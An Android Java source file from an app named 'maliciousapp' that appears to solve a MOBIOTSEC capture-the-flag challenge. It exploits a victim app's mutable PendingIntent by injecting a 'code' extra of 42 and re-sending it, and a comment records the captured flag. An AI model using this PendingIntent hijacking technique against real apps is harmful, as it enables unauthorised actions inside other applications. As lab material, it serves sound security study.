package com.example.maliciousapp;

import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

/*
2026-01-21 19:42:17.787 14542-14542 MOBIOTSEC               com.example.victimapp                I  FLAG{per_angusta_ad_augusta}
 */

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "CTF";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. RECEIVE: Get the Intent that the Victim App sent to us
        Intent receivedIntent = getIntent();

        // Verify it's the right action (good practice, though not strictly required if filter is unique)
        if ("mobiotsec.MUTATE_ME".equals(receivedIntent.getAction())) {

            // 2. EXTRACT: Get the "PendingIntent" token from the extras
            // The victim stored it under the key "pending_intent"
            PendingIntent victimToken = receivedIntent.getParcelableExtra("pending_intent");

            if (victimToken != null) {
                try {
                    // 3. MODIFY: Create a new Intent with the missing password
                    // We do NOT need to set the class/package here; the PendingIntent already knows where to go.
                    Intent fillInIntent = new Intent();
                    fillInIntent.putExtra("code", 42); // The check: if (code == 42)

                    // 4. FIRE: Send the token back to the victim
                    // Because the PendingIntent is MUTABLE, Android merges our 'fillInIntent'
                    // with the original intent inside the token.
                    victimToken.send(this, 0, fillInIntent);

                    Log.i(TAG, "Exploit executed: PendingIntent sent with code 42");

                } catch (PendingIntent.CanceledException e) {
                    e.printStackTrace();
                }
            }

        }
    }
}